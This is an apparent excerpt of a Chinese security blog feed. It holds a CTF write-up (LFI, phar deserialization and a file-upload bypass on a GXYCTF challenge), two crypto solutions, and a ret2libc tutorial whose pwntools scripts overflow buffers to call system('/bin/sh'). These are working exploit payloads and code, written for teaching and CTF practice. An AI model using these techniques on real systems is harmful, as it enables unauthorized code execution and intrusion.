concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)),1) --+ &amp;pw&#x3D;11</span><br><span class="line">得到后半部分，拼接得到flag</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.colabug.com/2019/1225/6768296/amp/" target="_blank" rel="noopener">https://www.colabug.com/2019/1225/6768296/amp/</a></p><h3 id="0x-04-Babysqliv3-0"><a href="#0x-04-Babysqliv3-0" class="headerlink" title="0x 04 Babysqliv3.0"></a>0x 04 Babysqliv3.0</h3><ul><li><p>来源</p><p>GXYCTF2019</p></li><li><p>解题过程</p></li></ul><ol><li>在登录页查看源码可以看到<code>&lt;!-- u9db8 --&gt;</code>，可以用Unicode解码得到鶸，说明这是一个弱口令，并不是注入题，用弱口令字典可以跑出来，账号口令是admin/password，即可成功登陆</li><li>登陆发现是一个文件上传，简单操作后发现只能上传txt文件；然后发现url里有引用，猜测可能存在LFI(Local File Include)，使用filter协议可以看网站源码。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10009&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure><p>home.php源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">上传文件</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">public $Filename;</span><br><span class="line">public $cmd;</span><br><span class="line">public $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function __construct()&#123;</span><br><span class="line">$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">@mkdir($sandbox, 0777, true);</span><br><span class="line">if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upload($file)&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __toString()&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line">&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">return $this-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">eval($this-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">$uploader &#x3D; new Uploader();</span><br><span class="line">$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">if(@file_get_contents($uploader))&#123;</span><br><span class="line">echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo file_get_contents($uploader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>官方解法：</p><p>只要构造一个phar反序列化文件，将命令替换为getflag操作，再把检查的token替换为服务器分发的，最后控制文件名进行反序列化操作，达到任意命令执行的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 使用时请将上文中的对象代码粘贴到本代码之前</span><br><span class="line">&lt;?php</span><br><span class="line">@unlink(&quot;exp.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">$o &#x3D; new Uploader();</span><br><span class="line">$o-&gt;token &#x3D; &quot;GXYb4b627c1236f2c1b9463e18e0e7bfe30&quot;;</span><br><span class="line">$o-&gt;cmd &#x3D; &quot;echo file_get_contents(&#39;.&#x2F;flag.php&#39;);&quot;;</span><br><span class="line">$o-&gt;Filename &#x3D;</span><br><span class="line">&quot;phar:&#x2F;&#x2F;uploads&#x2F;909c00f0b41f82ef8c579546b5ed765e&#x2F;GXYb4b627c1236f2c1b9463e18e</span><br><span class="line">0e7bfe30.txt&quot;;</span><br><span class="line">$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;a&quot;, &quot;a&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128134233300.png" alt></p><p>非预期解法：</p><p>控制URL中name参数直接上传php文件</p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128135733422.png" alt></p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128135811226.png" alt></p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B%5Cimage-20200128135857775.png" alt></p><p>nepnep战队解法：</p><p>在upload.php页面上传，get提交参数name=flag.php</p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B%5C11.png" alt></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x-01-密码本（提交你找到的字符串的md5值）"><a href="#0x-01-密码本（提交你找到的字符串的md5值）" class="headerlink" title="0x 01 密码本（提交你找到的字符串的md5值）"></a>0x 01 密码本（提交你找到的字符串的md5值）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个密码本本该只使用一次的，但是却使用了多次，导致密文易被破解</span><br><span class="line">经过一番尝试发现，秘钥的首字母很可能是y，剩下的就靠你了</span><br><span class="line"></span><br><span class="line">cip1: rlojsfklecby</span><br><span class="line">cip2: ulakqfgfsjlu</span><br><span class="line">cip3: dpaxwxtjgtay</span><br></pre></td></tr></table></figure><p>参考解法：<a href="https://blog.csdn.net/qq_34072526/article/details/88074122" target="_blank" rel="noopener">https://blog.csdn.net/qq_34072526/article/details/88074122</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">key &#x3D; &#39;yearofthepig&#39;</span><br><span class="line">t1 &#x3D; &#39;rlojsfklecby&#39;</span><br><span class="line">t2 &#x3D; &#39;ulakqfgfsjlu&#39;</span><br><span class="line">t3 &#x3D; &#39;dpaxwxtjgtay&#39;</span><br><span class="line">res1 &#x3D; res2 &#x3D; res3 &#x3D; &#39;&#39;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">    res1 +&#x3D; chr((ord(t1[i]) - ord(key[i])) %26 + ord(&#39;a&#39;))</span><br><span class="line">    res2 +&#x3D; chr((ord(t2[i]) - ord(key[i])) %26 + ord(&#39;a&#39;))</span><br><span class="line">    res3 +&#x3D; chr((ord(t3[i]) - ord(key[i])) %26 + ord(&#39;a&#39;))</span><br><span class="line">print res1</span><br><span class="line">print res2</span><br><span class="line">print res3</span><br></pre></td></tr></table></figure><p>转换为md5即为flag</p><h3 id="0x-02-EasyProgram"><a href="#0x-02-EasyProgram" class="headerlink" title="0x 02 EasyProgram"></a>0x 02 EasyProgram</h3><p>这道题给出的是伪代码，从伪代码中可以看出，这是一个RC4加密，于是使用RC4解密即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import io</span><br><span class="line">f &#x3D; io.open(&#39;file.txt&#39;,&#39;r&#39;,encoding&#x3D;&#39;ISO-8859-1&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">t &#x3D; []</span><br><span class="line">key &#x3D; &#39;whoami&#39;</span><br><span class="line">ch &#x3D; &#39;&#39;</span><br><span class="line">j &#x3D; 0 #初始化</span><br><span class="line">s &#x3D; list(range(256)) #创建有序列表</span><br><span class="line">for i in range(256):</span><br><span class="line">    j &#x3D; (j + s[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">    s[i],s[j] &#x3D; s[j],s[i]</span><br><span class="line">i &#x3D; 0 #初始化</span><br><span class="line">j &#x3D; 0 #初始化</span><br><span class="line">for r in c:</span><br><span class="line">    i &#x3D; (i + 1)  % 256</span><br><span class="line">    j &#x3D; (j + s[i])  % 256</span><br><span class="line">    s[i], s[j] &#x3D; s[j], s[i]</span><br><span class="line">    x &#x3D; (s[i] + (s[j] % 256)) % 256</span><br><span class="line">    ch +&#x3D; chr(ord(r) ^ s[x])</span><br><span class="line">print(ch)</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.cnblogs.com/gambler/p/9075415.html" target="_blank" rel="noopener">RC4加密算法原理简单理解</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安恒杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP-ret2libc原理及应用</title>
      <link href="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="01-前置知识"><a href="#01-前置知识" class="headerlink" title="01 前置知识"></a>01 前置知识</h3><ul><li><p>获取shell的方式</p><ul><li>序源码自带系统命令函数                               -简单溢出</li><li>可以找到system函数的plt的绝对地址               -ret2text</li><li>利用输入函数，将shellcode写入到程序中        -ret2shellcode</li><li>利用ROPGadget配合int 0x80调用execve        -ret2Syscall</li><li>利用Libc获取system函数的相对位置.               -ret2Libc</li></ul></li><li><p>plt/got概念</p><ul><li>plt表:Procedure Linkage Table程序联动表（内部函数表）</li><li>got表:Global Offset Table 全局偏移表（全局函数表）</li><li>下图跳过了_dl_runtime_resolve函数地址重定位的过程，直接展示重定位后的调用。<br>由于Libc的延时绑定机制，只有执行过的函数才会在got表中存下来。</li></ul></li></ul><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122094522330.png" alt></p><h3 id="02-Ret2libc原理"><a href="#02-Ret2libc原理" class="headerlink" title="02 Ret2libc原理"></a>02 Ret2libc原理</h3><p>Libc就是Linux下的C函数库，<strong>ret2libc</strong> 这种攻击方式主要是针对 <strong>动态链接(Dynamic linking)</strong> 编译的程序，因为正常情况下是无法在程序中找到像 <strong>system() 、execve()</strong> 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。因为程序是动态链接生成的，所以在程序运行时会调用 <strong>libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)</strong>，<strong>libc.so</strong> 是    linux 下 C 语言库中的运行库<strong>glibc</strong> 的动态链接版，并且 <strong>libc</strong>.<strong>so</strong> 中包含了大量的可以利用的函数，包括 <strong>system() 、execve()</strong> 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 <strong>system(“/bin/sh”)</strong> 来打开 shell， 如此就只剩下两个问题：</p><blockquote><p>1、找到 system() 函数的地址；</p></blockquote><blockquote><p> 2、在内存中找到 “/bin/sh” 这个字符串的地址。</p></blockquote><ul><li>攻击流程</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、泄露一个ret2libc函数的位置</span><br><span class="line">2、获取libc的版本</span><br><span class="line">3、根据偏移获取shell和sh的位置</span><br><span class="line">4、执行程序获取shell</span><br><span class="line"></span><br><span class="line">libc版本</span><br><span class="line">1、https:&#x2F;&#x2F;libc.blukat.me。  2. LibcSearcher</span><br><span class="line"></span><br><span class="line">1、求libc基地址（函数动态地址-函数偏移量）</span><br><span class="line">2、求其他函数地址（基地址+函数偏移量）</span><br></pre></td></tr></table></figure><h3 id="03-实例分析"><a href="#03-实例分析" class="headerlink" title="03 实例分析"></a>03 实例分析</h3><h4 id="3-1-ret2libc1"><a href="#3-1-ret2libc1" class="headerlink" title="3.1 ret2libc1"></a>3.1 ret2libc1</h4><ul><li>伪代码</li></ul><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100238760.png" alt></p><p>有一个gets函数会有溢出漏洞，程序开启了NX，说明我们在栈中的数据没有执行权限，我们需要使用ROP方式进行绕过，我们使用gdb的pattern进行测试溢出偏移量是112</p><p>接下里我们要做的是执行系统函数system(“/bin/sh”)，来获取系统的权限</p><p>所以我们可以想象我们的payload是：’a’ * 112 + system_plt + 0x0000000 + bin_sh_addr</p><p>我们需要system的plt地址以及字符串/bin/sh的地址</p><p>通过ida知道system的plt地址</p><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100805699.png" alt></p><p>获得/bin/sh的地址：</p><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100918061.png" alt></p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ret2libc1&#39;)</span><br><span class="line">system_plt_addr &#x3D; 0x08048460</span><br><span class="line">bin_sh_addr &#x3D; 0x08048720</span><br><span class="line">payload &#x3D; flat([&#39;a&#39; * 112 , system_plt_addr , 0x00000000 , bin_sh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="3-2-ret2libc2"><a href="#3-2-ret2libc2" class="headerlink" title="3.2 ret2libc2"></a>3.2 ret2libc2</h4><ul><li>伪代码</li></ul><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122101325253.png" alt></p><ul><li>解题思路</li></ul><p>这道题和第一个题没有太大区别，唯一的区别在于找不到字符串/bin/sh的地址了。所以我们需要重新构造。</p><p>除了在程序中查找/bin/sh的地址，我们也可以直接让用户输入。所以我们可以构造以下payload</p><p>payload = ‘a’ + get_plt + pop_ebx + bin_sh + system_plt + 0x00000000 + bin_sh</p><p>payload里的pop_ebx还是pop eax都无所谓，但我们使用ROPgadget在搜索的时候只能搜到pop ebx；ret</p><p>buf变量的值是bss段的内容，我们使用vmmap就可以看到有w权限的bss,在最末尾-16来保存我们gets输入的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_plt &#x3D; 0x08048490</span><br><span class="line">gets_plt &#x3D; 0x08048460</span><br><span class="line">buf &#x3D; 0x0804a0e4 - 16</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;a&#39; * 112,gets_plt,pop_ebx_addr,buf,system_plt,0x00000000,buf])</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122102521831.png" alt></p><h4 id="3-3-ret2libc3"><a href="#3-3-ret2libc3" class="headerlink" title="3.3 ret2libc3"></a>3.3 ret2libc3</h4><p>发现有gets函数，存在漏洞，使用GDB加载程序:gdb ./ret2libc3</p><p>发现有NX保护，我们使用ROP进行绕过。</p><p>我们可以构造payload = ‘a’ * offset + system_plt+0x00000000 + bin_sh_addr</p><p>发现没有system和/bin/sh，所以我们只能靠自己计算这两个的值了。</p><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li></ul><p>所以我们第一个要做的事情就是判断这个ret2libc3程序依赖的哪个libc，思路如下：</p><p>1、泄露一个ret2libc3函数的位置</p><p>2、获取libc的版本</p><p>3、根据偏移获取shell和sh的位置</p><p>4、执行程序获取shell</p><p>我们知道在Linux的程序中使用了延迟绑定机制，也就是说一个函数在没有执行前，你是不知道它的真实地址是什么的。而这个程序中我们能看到的有printf函数、gets函数。我们通过这两个函数来确定libc的版本。代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2libc3&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;ret2libc3&quot;)</span><br><span class="line">offset &#x3D; 112</span><br><span class="line">#要泄漏的函数的地址</span><br><span class="line">target_func &#x3D; &#39;puts&#39;</span><br><span class="line">#调用puts函数进行打印</span><br><span class="line">puts_func &#x3D; &#39;puts&#39;</span><br><span class="line">puts_plt &#x3D; elf.plt[puts_func]</span><br><span class="line">target_got &#x3D; elf.got[target_func]</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;]</span><br><span class="line">#调用puts函数，打印泄漏函数的got地址，最后返回main函数，在32位程序中调用函数地址的第一个参数就是返回地址，后面的才是参数</span><br><span class="line">payload &#x3D; offset * &#39;a&#39; + p32(puts_plt) + p32(main_addr) + p32(target_got)</span><br><span class="line">#payload &#x3D; flat([offset * &#39;a&#39;,puts_plt,main_addr,puts_got])</span><br><span class="line">p.sendlineafter(&quot;Can you find it !?&quot;,payload)</span><br><span class="line">print hex(u32(p.recv()[0:4]))</span><br></pre></td></tr></table></figure><p>我们看一下结果：确实后12位是不变的，3e0。(一个字符4个字节，3 *4 = 12)</p><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122103407652.png" alt></p><p>最后exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line">ret2libc3 &#x3D; ELF(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line">rop &#x3D; ROP(ret2libc3)</span><br><span class="line">func &#x3D; &#39;puts&#39;</span><br><span class="line">puts_plt &#x3D; ret2libc3.plt[&#39;puts&#39;]</span><br><span class="line">libc_start_main_got &#x3D; ret2libc3.got[func]</span><br><span class="line">main &#x3D; ret2libc3.symbols[&#39;main&#39;]# 获取main函数地址</span><br><span class="line">print &quot;leak libc_start_main_got addr and return to main again&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(&#39;Can you find it !?&#39;, payload)</span><br><span class="line">print &quot;get the related addr&quot;</span><br><span class="line">#获取puts函数运行时的地址</span><br><span class="line">libc_start_main_addr &#x3D; u32(sh.recv()[0:4])</span><br><span class="line">print libc_start_main_addr</span><br><span class="line"># 实例化LibcSearcher对象</span><br><span class="line">libc &#x3D; LibcSearcher(func, libc_start_main_addr)</span><br><span class="line"># 计算libc的初始地址（puts的动态地址-puts的偏移地址）</span><br><span class="line">libcbase &#x3D; libc_start_main_addr - libc.dump(func)</span><br><span class="line"># 计算system地址</span><br><span class="line">system_addr &#x3D; libcbase + libc.dump(&#39;system&#39;)</span><br><span class="line"># 计算&#x2F;bin&#x2F;sh地址</span><br><span class="line">binsh_addr &#x3D; libcbase + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">print &quot;get shell&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ROP-ret2libc原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary保护及突破</title>
      <link href="/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/"/>
      <url>/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/</url>
      
